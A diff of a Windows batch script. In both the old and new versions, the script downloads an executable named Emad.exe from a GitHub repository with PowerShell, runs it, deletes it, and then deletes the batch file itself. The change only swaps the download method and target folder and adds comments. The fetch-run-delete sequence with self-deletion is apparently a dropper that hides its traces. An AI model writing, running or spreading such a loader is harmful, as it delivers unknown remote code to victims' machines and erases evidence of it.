@@ -1,14 +1,21 @@
 @echo off
-set "url=https://github.com/emad8787/panel/raw/refs/heads/main/Emad.exe"
-set "destination=C:\Users\Administrator\AppData\Roaming\Emad.exe"
-set "batchFile=%~f0"
+:: Set the download directory
+set DOWNLOAD_DIR=C:\path\to\your\desired\folder
 
-echo Downloading file...
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
+:: Ensure the download directory exists
+if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%"
 
-echo Running file...
-start "" /wait "%destination%"
+:: Download the executable file to the specified directory
+powershell -Command "Invoke-WebRequest -Uri https://github.com/emad8787/panel/raw/refs/heads/main/Emad.exe -OutFile '%DOWNLOAD_DIR%\Emad.exe'"
 
-echo Cleaning up...
-del "%destination%"
-(del /f /q "%batchFile%" & exit)
+:: Run the executable
+start "" "%DOWNLOAD_DIR%\Emad.exe"
+
+:: Wait for the executable to finish before deleting the files
+timeout /t 5 /nobreak >nul
+
+:: Delete the downloaded executable file
+del "%DOWNLOAD_DIR%\Emad.exe"
+
+:: Delete the .bat file itself after execution
+del "%~f0"
